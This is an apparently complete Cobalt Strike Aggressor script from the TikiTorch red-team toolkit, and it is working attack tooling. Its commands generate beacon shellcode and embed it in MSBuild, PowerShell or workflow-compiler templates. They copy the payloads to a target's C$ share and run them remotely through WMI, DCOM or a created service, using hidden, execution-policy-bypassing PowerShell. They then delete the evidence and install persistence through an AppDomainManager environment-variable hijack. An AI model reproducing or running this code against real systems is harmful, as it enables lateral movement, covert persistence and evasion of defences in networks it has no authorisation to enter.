global('$WMI::AssemblyPath');
global('$CsExec::AssemblyPath');
global('$CsDCOM::AssemblyPath');
global('$CsEnv::AssemblyPath');
global('$TikiSpawnWOppid::DllPath');
global('$TikiSpawnWppid::DllPath');
global('$TikiSpawn::XmlPath');
global('$TikiService::AssemblyPath');
global('$TikiService::ConfigPath');
global('$TikiCompiler::XmlPath');
global('$TikiCompiler::CSPath');
global('$TikiManifest::CSPath');

$CsWMI::AssemblyPath = "D:\\Tools\\MiscTools\\CsWMI\\bin\\Release\\CsWMI.exe";
$CsExec::AssemblyPath = "D:\\Tools\\MiscTools\\CsExec\\bin\\Release\\CsExec.exe";
$CsDCOM::AssemblyPath = "D:\\Tools\\MiscTools\\CsDCOM\\bin\\Release\\CsDCOM.exe";
$CsEnv::AssemblyPath = "D:\\Tools\\MiscTools\\CsEnv\\bin\\Release\\CsEnv.exe";
$TikiSpawnWppid::DllPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawnWppid.dll";
$TikiSpawnWOppid::DllPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawnWOppid.dll";
$TikiSpawn::XmlPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawn.xml";
$TikiSpawn::PshPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawn.ps1";
$TikiService::AssemblyPath = "D:\\Tools\\TikiTorch\\TikiService\\bin\\Release\\TikiService.exe";
$TikiService::ConfigPath = "D:\\Tools\\TikiTorch\\TikiService\\bin\\Release\\TikiService.exe.config";
$TikiCompiler::XmlPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiCompiler.txt";
$TikiCompiler::CSPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiCompiler";
$TikiManifest::CSPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiManifest.cs";

if(!-exists $CsWMI::AssemblyPath) {
    show_error("WMI assembly not found!");
    exit();
}

if(!-exists $CsExec::AssemblyPath) {
    show_error("CsExec assembly not found!");
    exit();
}

if(!-exists $CsEnv::AssemblyPath) {
    show_error("CsEnv assembly not found!");
    exit();
}

if(!-exists $TikiSpawnWOppid::DllPath) {
    show_error("TikiSpawn DLL not found!");
    exit();
}

if(!-exists $TikiSpawn::XmlPath) {
    show_error("XML template not found!");
    exit();
}

if(!-exists $TikiSpawn::PshPath) {
    show_error("PowerShell template not found!");
    exit();
}

if(!-exists $TikiService::AssemblyPath) {
    show_error("TikiService assembly not found!");
    exit();
}

if(!-exists $TikiService::ConfigPath) {
    show_error("TikiService config not found!");
    exit();
}

if(!-exists $TikiCompiler::XmlPath) {
    show_error("TikiCompiler XML template not found!");
    exit();
}

if(!-exists $TikiCompiler::CSPath) {
    show_error("TikiCompiler C# template not found!");
    exit();
}

alias tikilateral {
	
	$bid = $1;

	$input = substr($0, 12);
	@args = split(' ', $input);

	#########################
	## Check args[] length ##
	#########################

	if (size(@args) eq "6") {

		$target = @args[0];
		$listener = @args[1];
		$arch = @args[2];
		$binary = @args[3];
		$payload = @args[4];
		$method = @args[5];
	}

	################
	## Get Method ##
	################

	@method = split(':', $method);
	$m0 = @method[0];
	$m1 = @method[1];

	############
	## Errors ##
	############

	if (size(@args) ne "6") {
		berror($bid, "Invalid number of arguments");
		return;
	}

	if (listener_info($listener, "payload") eq "") {
		berror($bid, "Invalid listener");
		return;
	}

	if (($arch ne "x64") && ($arch ne "x86")) {
		berror($bid, "Invalid architecture");
		return;
	}

	if (($m0 ne "wmi") && ($m0 ne "dcom")) {
		berror($bid, "Invalid method");
		return;
	}

	btask($bid, "Tasked Beacon to run " . listener_describe($listener) . " on " . $target . " using " . $payload . " with " . $method);

	###############
	## Shellcode ##
	###############

	artifact_stageless($listener, "raw", $arch, $null, $this);
	yield;
	$shellcode = base64_encode($1);

	##################
	## Prep Payload ##
	##################

	if ($payload eq "msbuild") { $final = msbuild_data_swap($binary, $shellcode, $TikiSpawnWOppid::DllPath, $TikiSpawn::XmlPath); }
	else if ($payload eq "powershell") { $final = powershell_data_swap($binary, $shellcode, $TikiSpawnWOppid::DllPath, $TikiSpawn::PshPath); }
	else if ($payload eq "workflowcompiler") { $final = compilerworkflow_data_swap($binary, $shellcode, $TikiSpawnWOppid::DllPath, $TikiCompiler::CSPath); }

	####################
	## Upload and Run ##
	####################

	if ($payload eq "msbuild") {

		bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.xml", $final);

		if ($arch eq "x64") { $buildPath = "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\msbuild.exe"; }
		else if ($arch eq "x86") { $buildPath = "c:\\windows\\microsoft.net\\framework\\v4.0.30319\\msbuild.exe"; }

		if ($m0 eq "wmi") { bexecute_assembly!($bid, $CsWMI::AssemblyPath, " $+ $target $+  \" $+ $buildPath $+  c:\\windows\\temp\\tikispawn.xml\"  $+ $m1 $+ "); }
		else if ($m0 eq "dcom") { bexecute_assembly!($bid, $CsDCOM::AssemblyPath, " $+ $target $+   $+ $buildPath $+  c:\\windows\\temp\\tikispawn.xml  $+ $m1 $+ "); }

	} else if ($payload eq "powershell") {

		bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.ps1", $final);

		$pshPath = "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe";

		if ($m0 eq "wmi") { bexecute_assembly!($bid, $CsWMI::AssemblyPath, " $+ $target $+  \" $+ $pshPath $+  -nop -w hidden -ep bypass -file  c:\\windows\\temp\\tikispawn.ps1\"  $+ $m1 $+ "); }
		else if ($m0 eq "dcom") { bexecute_assembly!($bid, $CsDCOM::AssemblyPath, " $+ $target $+   $+ $pshPath $+  \"-nop -w hidden -ep bypass -file c:\\windows\\temp\\tikispawn.ps1\"  $+ $m1 $+ "); }

	} else if ($payload eq "workflowcompiler" ) {

		$handle = openf($TikiCompiler::XmlPath);
		$xml = readb($handle, -1);
		closef($handle);

		bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikicompiler", $final);
		bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikicompiler.txt", $xml);

		if ($arch eq "x64") { $path = "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\microsoft.workflow.compiler.exe"; }
		else if ($arch eq "x86") { $path = "c:\\windows\\microsoft.net\\framework\\v4.0.30319\\microsoft.workflow.compiler.exe"; }
		
		if ($m0 eq "wmi") { bexecute_assembly!($bid, $CsWMI::AssemblyPath, " $+ $target $+  \" $+ $path $+  c:\\windows\\temp\\tikicompiler.txt c:\\windows\\temp\\output.txt\"  $+ $m1 $+ "); }
		else if ($m0 eq "dcom") { bexecute_assembly!($bid, $CsDCOM::AssemblyPath, " $+ $target $+   $+ $path $+  \"c:\\windows\\temp\\tikicompiler.txt c:\\windows\\temp\\output.txt\"  $+ $m1 $+ "); }

	}

	################
	# Wait & link ##
	################

	if ($payload eq "workflowcompiler") {
		bpause!($bid, 10000);
	} else {
		bpause!($bid, 3000);
	}
	
	blink!($bid, $target);

	#################
	## Remove File ##
	#################

	if ($payload eq "msbuild") {
		brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.xml");
	} else if ($payload eq "powershell") {
		brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.ps1");
	} else if ($payload eq "workflowcompiler") {
		brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikicompiler.txt");
		brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikicompiler");
		brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\output.txt");
	}
}

alias tikiexec {
	
	$bid = $1;

	$input = substr($0, 9);
	@args = split(' ', $input);

	#########################
	## Check args[] length ##
	#########################

	if (size(@args) eq "4") {

		$target = @args[0];
		$listener = @args[1];
		$arch = @args[2];
		$binary = @args[3];

	}

	############
	## Errors ##
	############

	if (listener_info($listener, "payload") eq "") {
		berror($bid, "Invalid listener");
		return;
	}

	if (($arch ne "x64") && ($arch ne "x86")) {
		berror($bid, "Invalid architecture");
		return;
	}

	btask($bid, "Tasked Beacon to run " . listener_describe($listener) . " on " . $target . " using TikiExec");

	###############
	## Shellcode ##
	###############

	artifact_stageless($listener, "raw", $arch, $null, $this);
	yield;
	$shellcode = base64_encode($1);

	################
	## Prep Files ##
	################

	$handle = openf($TikiService::AssemblyPath);
	$exe = readb($handle, -1);
	closef($handle);

	$config = tikiexec_data_swap($binary, $shellcode, $TikiService::ConfigPath);

	####################
	## Upload and Run ##
	####################

	bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikiservice.exe", $exe);
	bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikiservice.exe.config", $config);

	bexecute_assembly!($bid, $CsExec::AssemblyPath, " $+ $target $+  TikiSvc \"Tiki Service\" c:\\windows\\temp\\tikiservice.exe");

	bpause!($bid, 1000);
	blink!($bid, $target);
	
	##################
	## Remove Files ##
	##################

	brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikiservice.exe");
	brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikiservice.exe.config");
}

alias tikipersist {

$bid = $1;

	$input = substr($0, 12);
	@args = split(' ', $input);

	#########################
	## Check args[] length ##
	#########################

	if (size(@args) eq "4") {

		$listener = @args[0];
		$arch = @args[1];
		$binary = @args[2];
		$method = @args[3];
	}

	############
	## Errors ##
	############

	if (size(@args) ne "4") {
		berror($bid, "Invalid number of arguments");
		return;
	}

	if (listener_info($listener, "payload") eq "") {
		berror($bid, "Invalid listener");
		return;
	}

	if (($arch ne "x64") && ($arch ne "x86")) {
		berror($bid, "Invalid architecture");
		return;
	}

	if (($method ne "manifest")) {
		berror($bid, "Invalid method");
		return;
	}

	btask($bid, "Tasked Beacon to persist with " . listener_describe($listener) . " and " . $method);

	###############
	## Shellcode ##
	###############

	artifact_stageless($listener, "raw", $arch, $null, $this);
	yield;
	$shellcode = base64_encode($1);

	##################
	## Prep Payload ##
	##################

	if ($method eq "manifest") {
		$final = manifest_data_swap($binary, $shellcode, $TikiSpawnWppid::DllPath, $TikiManifest::CSPath);

		$handle = openf(">C:\\Windows\\Temp\\TikiManifest.cs");
		writeb($handle, $final);
		closef($handle);
	}

	$buildPath = "";
	
	if ($arch eq "x64") { $buildPath = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"; }
	else { $buildPath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe"; }

	$buildCmd = $buildPath . " /target:library /unsafe /out:C:\\Windows\\Temp\\tasks.dll C:\\Windows\\Temp\\TikiManifest.cs";

	$process = exec("cmd.exe /c \"$buildCmd\"");
    @data = readAll($process);
    printAll(@data);
    closef($process);

    ####################
	## Upload and Run ##
	####################

	if ($method eq "manifest") {

		$handle = openf("C:\\Windows\\Temp\\tasks.dll");
		$dll = readb($handle, -1);
		closef($handle);

		bupload_raw!($bid, "c:\\windows\\system32\\tasks\\tasks.dll", $dll);

		bexecute_assembly!($bid, $CsEnv::AssemblyPath, "APPDOMAIN_MANAGER_ASM \"tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null\" user");
		bexecute_assembly!($bid, $CsEnv::AssemblyPath, "APPDOMAIN_MANAGER_TYPE TikiTorchDomainManager user");
		bexecute_assembly!($bid, $CsEnv::AssemblyPath, "COMPLUS_Version v4.0.30319 user");
	}

	#############
	## Cleanup ##
	#############

	$process = exec("cmd.exe /c \"del C:\\Windows\\Temp\\TikiManifest.cs && del C:\\Windows\\Temp\\tasks.dll\"");
    @data = readAll($process);
    printAll(@data);
    closef($process);

}

sub msbuild_data_swap {
	
	$binary = $1;
	$shellcode = $2;
	$dllPath = $3;
	$template = $4;

	$handle = openf($dllPath);
	$dll = base64_encode(readb($handle, -1));

	if (-canread $template) {

		$handle = openf($template);
		@data = readAll($handle);
		closef($handle);
		remove(@data, @data[21]);
		add(@data, "            public const string binary = @\" $+ $binary $+ \"\;", 21);
		remove(@data, @data[22]);
		add(@data, "            public const string shellcode = @\" $+ $shellcode $+ \"\;", 22);
		remove(@data, @data[23]);
		add(@data, "            public const string dll = @\" $+ $dll $+ \"\;", 23);

		$data = "";

		for ($i = 0; $i < size(@data); $i++) {
			$data = $data . @data[$i] . "\r\n";
		}
	}

	return $data;
}

sub powershell_data_swap {
	
	$binary = $1;
	$shellcode = $2;
	$dllPath = $3;
	$template = $4;

	$handle = openf($dllPath);
	$dll = base64_encode(readb($handle, -1));

	if (-canread $template) {

		$handle = openf($template);
		@data = readAll($handle);
		closef($handle);
		remove(@data, @data[0]);
		add(@data, "\$binary = \"$binary\"", 0);
		remove(@data, @data[1]);
		add(@data, "\$dll = \"$dll\"", 1);
		remove(@data, @data[2]);
		add(@data, "\$shellcode = \"$shellcode\"", 2);

		$data = "";

		for ($i = 0; $i < size(@data); $i++) {
			$data = $data . @data[$i] . "\r\n";
		}
	}

	return $data;
}

sub compilerworkflow_data_swap {
	
	$binary = $1;
	$shellcode = $2;
	$dllPath = $3;
	$template = $4;

	$handle = openf($dllPath);
	$dll = base64_encode(readb($handle, -1));

	if (-canread $template) {

		$handle = openf($template);
		@data = readAll($handle);
		closef($handle);
		remove(@data, @data[7]);
		add(@data, "	const string binary = \@\"$binary\"\;", 7);
		remove(@data, @data[8]);
		add(@data, "	const string shellcode = \"$shellcode\"\;", 8);
		remove(@data, @data[9]);
		add(@data, "	const string dll = \"$dll\"\;", 9);

		$data = "";

		for ($i = 0; $i < size(@data); $i++) {
			$data = $data . @data[$i] . "\r\n";
		}
	}

	return $data;
}

sub manifest_data_swap {
	
	$binary = $1;
	$shellcode = $2;
	$dllPath = $3;
	$template = $4;

	$handle = openf($dllPath);
	$dll = base64_encode(readb($handle, -1));

	if (-canread $template) {

		$handle = openf($template);
		@data = readAll($handle);
		closef($handle);
		remove(@data, @data[16]);
		add(@data, "	static string dll = \"$dll\"\;", 16);
		remove(@data, @data[17]);
		add(@data, "	static string binary = \@\"$binary\";", 17);
		remove(@data, @data[18]);
		add(@data, "	static string shellcode = \"$shellcode\"\;", 18);

		$data = "";

		for ($i = 0; $i < size(@data); $i++) {
			$data = $data . @data[$i] . "\r\n";
		}

	}

	return $data;
}

sub tikiexec_data_swap {
	
	$binary = $1;
	$shellcode = $2;
	$appConfig = $3;

	if (-canread $appConfig) {

		$handle = openf($appConfig);
		@data = readAll($handle);
		closef($handle);
		remove(@data, @data[6]);
		add(@data, "    <add key=\"Binary\" value=\" $+ $binary $+ \"/>", 6);
		remove(@data, @data[7]);
		add(@data, "    <add key=\"Shellcode\" value=\" $+ $shellcode $+ \"/>", 7);

		$data = "";

		for ($i = 0; $i < size(@data); $i++) {
			$data = $data . @data[$i] . "\r\n";
		}
	}

	return $data;
}

beacon_command_register (

	"tikilateral",
	"Execute a TikiTorch payload on a host",
	"Execute a TikiTorch payload on the remote target using\n" .
	"the specified payload type and code execution method.\n\n" .
	"Use: tikilateral [target] [listener] [x64|x86] [binary] [payload] [method]\n\n" .
	"     Payloads: powershell\n" .
	"               msbuild\n" .
	"               workflowcompiler\n\n" .
	"     Methods: wmi:processcallcreate\n" .
	"              dcom:mmc20.application\n" .
	"              dcom:shellwindows\n" .
	"              dcom:shellbrowserwindow\n" .
	"              dcom:exceldde\n\n" .
	"Example: tikilateral dc1 smb x64 c:\\windows\\system32\\svchost.exe msbuild dcom:mmc20.application\n" .
	"Example: tikilateral dc1 smb x64 c:\\windows\\notepad.exe powershell wmi:processcallcreate"
);

beacon_command_register (

	"tikiexec",
	"Use a service to run a TikiTorch payload on a host",
	"Copy a TikiTorch payload to the remote target\n" .
	"and execute it using the Service Control Manager.\n\n" .
	"Use: tikiexec [target] [listener] [x64|x86] [binary]"
);

beacon_command_register (

	"tikipersist",
	"Persist on a host with a TikiTorch payload",
	"Install a persistence mechanism on the target using\n" .
	"a TikiTorch payload and the specified method.\n\n" .
	"Use: tikipersist [listener] [x64|x86] [binary] [method]\n\n" .
	"     Methods: manifest\n\n" .
	"Example: tikipersist http x64 c:\\windows\\notepad.exe manifest"
);